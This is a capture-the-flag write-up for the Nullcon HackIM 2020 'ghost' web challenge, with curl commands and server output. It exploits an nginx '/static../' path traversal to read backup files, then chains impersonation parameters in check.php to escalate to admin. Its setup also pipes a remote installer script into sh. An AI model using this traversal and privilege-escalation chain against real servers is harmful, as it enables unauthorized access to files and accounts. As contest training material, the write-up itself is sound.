# Nullcon HackIM 2020 Writeup - ghost

## Challenge
Ever had a scary feeling when you are alone that there is something in the room, but you cant see it with your eyes alone_?

Don't be scared to probe at - https://web1.ctf.nullcon.net:8443/ _.

Note: Challenge Is Not Down_.

## Solution
### Stage 1
```ERR_CONNECTION_REFUSED``` occurs even when accessing the URL with Chrome.\
if you look at the hint, you will see a gif image of a woman counting1, 2 and 3.\
It will be connect if you use HTTP3.\
To make an HTTP3 connection with curl, you need to build an HTTP3 compliant version of curl yourself.\

#### Curl installation for HTTP3
Install the packages and libraries required.\
```
$ apt install cmake autoconf libtool pkg-config
# Install RUST (since the cargo command is required)
$ curl https://sh.rustup.rs -sSf | sh
Install golang # Download tar.gz from https://golang.org/dl/ $ tar -C / usr / local -xzf go1.13.7.linux-amd64.tar.gz
$ export PATH = $ PATH: / usr / local / go / bin
```

Look at [curl_http3](https://github.com/curl/curl/blob/master/docs/HTTP3.md) to install curl for HTTP3

If successful, you can see HTTP3 in Features.\
```
$ curl -V
...
Features: ... HTTP3 ...
```
#### Capture
Try to access by using the curl command with the --http3 option.
```
$ curl --http3 https://web1.ctf.nullcon.net:8443/ -v
    * Trying 139.59.34.79:8443 ...
    * Sent QUIC client Initial, ALPN: h3-25h3-24h3-23
    * h3 [: method: GET]
    * h3 [: path: /]
    * h3 [: scheme: https]
    * h3 [: authority: web1.ctf.nullcon.net:8443]
    * h3 [user-agent: curl / 7.69.0-DEV]
    * h3 [accept: * / *]
    * Using HTTP / 3 Stream ID: 0 (easy handle 0x55e190e16850)
    > GET / HTTP / 3
    > Host: web1.ctf.nullcon.net:8443
    > user-agent: curl / 7.69.0-DEV
    > accept: * / *
    > 
    <HTTP / 3 200
    <server: nginx / 1.16.1
    <date: Sat, 08 Feb 2020 05:00:19 GMT
    <content-type: text / html
    <content-length: 374
    <last-modified: Wed, 05 Feb 2020 19:18:19 GMT
    <etag: "5e3b14fb-176"
    <alt-svc: h3-23 = ": 443"; ma = 86400
    <accept-ranges: bytes
    < 
    <! DOCTYPE html>
    <html lang = "en">
    <head>
    <meta charset = "utf-8">
    <title> How are you here? </ title>

    </ head>
    <body>


    <center> <h1> Shit! </ h1>
    <h3> How on earth did you reach here? </ h3>
    <h3> We added another layer of security to so we dont get hacked. Can you breach that also? </ h3>
    <img src = "/ static / giphy.gif"> </ img>
    </ center>

    <!-No need to bruteforce #->

    </ body>
    </ html>

    * Connection # 0 to host web1.ctf.nullcon.net left intact
```
```<img src = "/ static / giphy.gif"> </ img>``` check ```static``` directory, you can see that the static directory listing is valid.\
```
$ curl --http3 https://web1.ctf.nullcon.net:8443/static/
    <html>
    <head> <title> Index of / static / </ title> </ head>
    <body>
    <h1> Index of / static / </ h1> <hr> <pre> <a href="../"> ../ </a>
    <a href="giphy.gif"> giphy.gif </a> 05-Feb-2020 19:18 5801332
    </ pre> <hr> </ body>
    </ html>
```
!!! misconfiguration of nginx creates a path traversal vulnerability.\
```
$ curl --http3 https://web1.ctf.nullcon.net:8443/static../
    <html>
    <head> <title> Index of / static ../</ title> </ head>
    <body>
    <h1> Index of / static ../</ h1> <hr> <pre> <a href="../"> ../ </a>
    <a href="backup/"> backup / </a> 05-Feb-2020 19:18-
    <a href="html/"> html / </a> 05-Feb-2020 19:18-
    <a href="static/"> static / </a> 05-Feb-2020 19:18-
    </ pre> <hr> </ body>
    </ html>
```
```
$ curl --http3 https://web1.ctf.nullcon.net:8443/static../backup/
    <html>
    <head> <title> Index of / static ../ backup / </ title> </ head>
    <body>
    <h1> Index of / static ../ backup / </ h1> <hr> <pre> <a href="../"> ../ </a>
    <a href="links.txt"> links.txt </a> 05-Feb-2020 19:18 277
    <a href="nginx.conf"> nginx.conf </a> 05-Feb-2020 19:18 1242
    </ pre> <hr> </ body>
    </ html>
```
```
$ curl --http3 https://web1.ctf.nullcon.net:8443/static../backup/links.txt
    To signup
    http: //localhost/check.php? signup = true & name = asd

    To Impersonate a person
    http: //localhost/check.php? impersonator = asd & impersonatee = check

    To umimpersonate a person
    http: //localhost/check.php? unimpersonate = asd-admin

    To get status
    http: //localhost/check.php? status = asd 
```
Next step -> attack ```/check.php``` :D\

### Stage 2
So as you see, ```/check.php``` function diffrently depending on the params.

When the sign-up and check the status, you can see that in addition to the user with the name specified in the parameter, a user with the admin role with ```-admin``` at the end of the name has been created.
```
$ curl --http3 -H "cookie: PHPSESSID = b7648f7c4261c2a885eda5c1322aba1c" "https://web1.ctf.nullcon.net:8443/check.php?signup=true&name=asd"
    <center> <h1> Welcome to password less authentication system </ h1> </ center> Please become admin, username: asd-admin 
```
```
$ curl --http3 -H "cookie: PHPSESSID = b7648f7c4261c2a885eda5c1322aba1c" "https://web1.ctf.nullcon.net:8443/check.php?status=asd"
    <center> <h1> Welcome to password less authentication system </ h1> </ center>
    name: asd </br>
    impersonating: </br>
    role: user </br>
    admin name: asd-admin </br>
    admin role: admin </br>
    Please become admin, username: asd-admin 
```

```
$ curl --http3 -H "cookie: PHPSESSID = b7648f7c4261c2a885eda5c1322aba1c" "https://web1.ctf.nullcon.net:8443/check.php?impersonator=asd&impersonatee=check"
    <center> <h1> Welcome to password less authentication system </ h1> </ center> You are not admin
```
```
$ curl --http3 -H "cookie: PHPSESSID = b7648f7c4261c2a885eda5c1322aba1c" "https://web1.ctf.nullcon.net:8443/check.php?status=asd"
    <center> <h1> Welcome to password less authentication system </ h1> </ center>
    name: asd </br>
    impersonating: check </br>
    role: user </br>
    admin name: asd-admin </br>
    admin role: admin </br>
    You are not admin
```
:/ user with the admin role cannot impersonate.
```
$ curl --http3 -H "cookie: PHPSESSID = b7648f7c4261c2a885eda5c1322aba1c" "https://web1.ctf.nullcon.net:8443/check.php?impersonator=asd&impersonatee=asd-admin"
    <center> <h1> Welcome to password less authentication system </ h1> </ center> cannot impersonate admin role 
```

Try to bypasse this by remove the impresonation of a user with the role of admin.
- Impersonate ```asd-admin``` as ```asd```.
- Impersonate ```asd``` as ```asd-admin```.
- ```asd-admin``` spoof of ```asd-admin```.
- ```asd``` has an admin role because it is still impersonating ```asd-admin```.

```
$ curl --http3 -H "cookie: PHPSESSID = b7648f7c4261c2a885eda5c1322aba1c" "https://web1.ctf.nullcon.net:8443/check.php?signup=true&name=asd"
    <center> <h1> Welcome to password less authentication system </ h1> </ center> Please become admin, username: asd-admin 
```
```
$ curl --http3 -H "cookie: PHPSESSID = b7648f7c4261c2a885eda5c1322aba1c" "https://web1.ctf.nullcon.net:8443/check.php?impersonator=asd-admin&impersonatee=asd"
    <center> <h1> Welcome to password less authentication system </ h1> </ center> You are not admin 
```
```
$ curl --http3 -H "cookie: PHPSESSID = b7648f7c4261c2a885eda5c1322aba1c" "https://web1.ctf.nullcon.net:8443/check.php?impersonator=asd&impersonatee=asd-admin"
    <center> <h1> Welcome to password less authentication system </ h1> </ center> You admin role is not admin
```
```
$ curl --http3 -H "cookie: PHPSESSID = b7648f7c4261c2a885eda5c1322aba1c" "https://web1.ctf.nullcon.net:8443/check.php?unimpersonate=asd-admin"
    <center> <h1> Welcome to password less authentication system </ h1> </ center> hackim20 {We_Never_Thought_it_Was_That_Vulnerable}
```
## Flag
the flag is ```hackim20 {We_Never_Thought_it_Was_That_Vulnerable}```

##### source
https://graneed.hatenablog.com/entry/2020/02/09/143359